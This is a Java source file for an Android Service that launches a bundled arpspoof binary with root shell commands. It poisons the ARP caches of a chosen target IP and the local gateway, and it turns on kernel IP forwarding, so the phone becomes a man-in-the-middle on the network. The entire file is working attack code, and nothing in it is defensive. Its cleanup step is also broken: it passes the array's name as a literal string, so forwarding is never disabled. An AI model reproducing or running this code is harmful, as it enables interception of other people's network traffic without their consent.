package library.lanshifu.com.myapplication.network_into.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

import com.jaredrummler.android.shell.Shell;

import java.net.NetworkInterface;

import library.lanshifu.com.lsf_library.utils.PrefUtil;
import library.lanshifu.com.myapplication.network_into.NetworkHelper;

public class ArpService extends Service {

    /**
     * 0，表示禁止数据包转发，1表示允许
     */
    private String[] FORWARD_COMMANDS = {"echo 1 > /proc/sys/net/ipv4/ip_forward",
            "echo 1 > /proc/sys/net/ipv6/conf/all/forwarding"};

    private String[] UN_FORWARD_COMMANDS = {"echo 0 > /proc/sys/net/ipv4/ip_forward",
            "echo 0 > /proc/sys/net/ipv6/conf/all/forwarding"};

    public static final int TWO_WAY = 0x3;
    public static final int ONE_WAY_ROUTE = 0x1;
    public static final int ONE_WAY_HOST = 0x2;
    public static final String TARGET_IP = "target_ip";

    private Thread arpSpoof = null;
    private String arp_spoof_cmd = null;
    private String target_ip;
    private String arp_spoof_recv_cmd = null;
    private Thread arpSpoofRecv = null;
    private int arp_cheat_way = -1;
    private boolean ip_forward = true;


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Shell.cmd("killall arpspoof");
//		ShellUtils.execCommand("killall arpspoof", true, true);
        ip_forward = intent.getBooleanExtra("ip_forward", true);
        if (ip_forward)
            Shell.cmd(FORWARD_COMMANDS);
        else
            Shell.cmd(UN_FORWARD_COMMANDS);

        String interfaceName = null;
        try {
            interfaceName = NetworkInterface.getByInetAddress(
                    NetworkHelper.getInetAddress()).getDisplayName();
        } catch (Exception e) {
            e.printStackTrace();
            try {
                interfaceName = NetworkInterface.getByInetAddress(
                        NetworkHelper.getInetAddress()).getDisplayName();
            } catch (Exception se) {
                Toast.makeText(this, "出错了",
                        Toast.LENGTH_SHORT).show();
                return START_STICKY_COMPATIBILITY;
            }
        }
        if (arp_cheat_way == -1) {
            arp_cheat_way = intent.getIntExtra("arp_cheat_way", PrefUtil.getInstance().getInt("arp_cheat_way", ONE_WAY_HOST));
        }

        if ((ONE_WAY_HOST & arp_cheat_way) != 0) {
            if (target_ip == null) {
                target_ip = intent.getStringExtra("target_ip");
            }

            if (!target_ip.equals(NetworkHelper.getGateway())) {
                arp_spoof_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
                        + " -t " + target_ip + " "
                        + NetworkHelper.getGateway();
            } else {
                arp_spoof_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
                        + " -t " + NetworkHelper.getGateway() + " "
                        + target_ip;
            }

            arpSpoof = new Thread() {

                @Override
                public void run() {
                    Shell.cmd(arp_spoof_cmd);
                }
            };
            arpSpoof.start();
        }
        if ((ONE_WAY_ROUTE & arp_cheat_way) != 0) {
            arp_spoof_recv_cmd = getFilesDir() + "/arpspoof -i " + interfaceName
                    + " -t " + NetworkHelper.getGateway() + " "
                    + NetworkHelper.getIp();

            arpSpoofRecv = new Thread() {
                @Override
                public void run() {
                    Shell.cmd(arp_spoof_recv_cmd);
                }
            };
            arpSpoofRecv.start();
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        if (arpSpoof != null) {
            arpSpoof.interrupt();
            arpSpoof = null;
        }
        if (arpSpoofRecv != null) {
            arpSpoofRecv.interrupt();
            arpSpoofRecv = null;
        }
        new Thread() {
            public void run() {
                Shell.cmd("killall arpspoof");
                if (ip_forward) {
                    Shell.cmd("UN_FORWARD_COMMANDS");
                }
            }
        }.start();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
